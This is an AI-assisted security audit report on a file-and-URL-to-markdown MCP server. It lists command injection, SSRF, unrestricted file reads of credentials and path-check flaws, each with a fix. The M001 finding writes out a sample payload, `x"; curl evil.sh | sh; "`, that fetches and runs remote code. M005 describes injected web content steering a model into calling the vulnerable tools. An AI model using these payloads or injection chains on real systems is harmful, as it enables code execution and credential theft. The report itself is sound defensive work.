# Agent & MCP security report

Scanned: `/tmp/blind/c19` · 2026-11-23T20:32:48+00:00 · auditor v1.0.0 · mode: reviewed

## Verdict: 🔴 Fix before shipping

| Critical | High | Medium | Low | Info | Dismissed as false alarm | Needs context |
|---|---|---|---|---|---|---|
| 1 | 2 | 1 | 1 | 0 | 0 | 0 |

## What was checked

- MCP servers in config files: **0** · tools found in code: **10** · agent/MCP code files: **3** · agent instruction files: **0**
- Frameworks seen: mcp, modelcontextprotocol

## Findings

### M001 · CRITICAL · Tool filepath / uvPath / projectRoot pasted into a shell command via exec()
`None:None` · ASI05 Unexpected Code Execution

filepath from any *-to-markdown tool goes inside double quotes in a string run by child_process.exec (a shell), so filepath `x"; curl evil.sh | sh; "` or `$(id)` runs commands; the hidden-but-accepted uvPath argument is even the program itself, and projectRoot is pasted unquoted.
> `src/server.ts:82` — `filePath: validatedArgs.filepath,`
> `src/server.ts:84` — `uvPath: validatedArgs.uvPath || process.env.UV_PATH,`
> `src/Markdownify.ts:36` — ``${uvPath} run ${markitdownPath} "${filePath}"`,`

**Fix:** Use execFile(uvPath, ['run', markitdownPath, '--', filePath]) with no shell; drop uvPath and projectRoot from the request schema and take them only from operator config/env.

### M002 · HIGH · URL tools only block literal private IPs; hostnames and redirects reach internal services
`None:None` · ASI02 Tool Misuse and Exploitation

is_ip_private only inspects the literal hostname string, so `http://localhost/`, a DNS name resolving to 127.0.0.1 / 169.254.169.254, or a public URL that redirects to an internal one is fetched (fetch follows redirects) and its body is returned to the model.
> `src/server.ts:61` — `if (is_ip_private(parsedUrl.hostname)) {`
> `src/Markdownify.ts:87` — `const response = await fetch(url);`

**Fix:** Resolve the hostname with dns.lookup (all addresses) and reject private/loopback/link-local/IPv6-local ranges, fetch with redirect: 'manual' and re-check each hop, and pin the connection to the checked IP.

### M003 · HIGH · File-conversion tools read any file path with no root restriction
`None:None` · ASI02 Tool Misuse and Exploitation

pdf/image/audio/docx/xlsx/pptx-to-markdown accept any absolute path and markitdown converts plain-text files too, so `~/.ssh/id_rsa`, `.env` or cloud credential files are returned to the model.
> `src/server.ts:82` — `filePath: validatedArgs.filepath,`
> `src/Markdownify.ts:101` — `inputPath = filePath;`

**Fix:** Resolve the path with fs.realpathSync, require it to be inside a configured allowed directory (path.relative not starting with '..'), and check the extension matches the tool.

### M004 · MEDIUM · get-markdown-file: optional prefix check without separator, on a different path than the one read
`None:None` · ASI02 Tool Misuse and Exploitation

The containment check only runs when MD_SHARE_DIR is set, uses startsWith without a trailing separator (`/share` also allows `/share-evil/x.md`), checks the unresolved path (symlinks inside the share dir escape it) and then reads the raw filePath; reads are limited to .md/.markdown names.
> `src/Markdownify.ts:137` — `if (!normPath.startsWith(allowedShareDir)) {`
> `src/Markdownify.ts:146` — `const text = await fs.promises.readFile(filePath, "utf-8");`

**Fix:** Make MD_SHARE_DIR mandatory, realpath both paths, require path.relative(root, real) not to start with '..', and read the checked real path.

### M005 · LOW · Fetched web pages / documents returned raw into the model context
`None:None` · 

Webpage, Bing, YouTube and document content goes straight into the model context unmarked; injected text there can steer the model into calling the command-injectable file tools.
> `src/server.ts:105` — `{ type: "text", text: result.text },`

**Fix:** Wrap returned content in clearly marked untrusted-data delimiters and tell clients to treat it as data; fixing M001 removes the most dangerous follow-on.

## Limits

- Static review: the auditor reads code and configs; it does not run servers or attack them. Logic bugs, auth flaws in other services and runtime behaviour can be missed.
- Tool descriptions are checked as written in the code or a tools/list export; a remote server can return different text at runtime (use `pin --check` on exported tools.json).
- AI-assisted: findings are judged by an AI agent with every quote verified against the code; a human should confirm critical fixes.
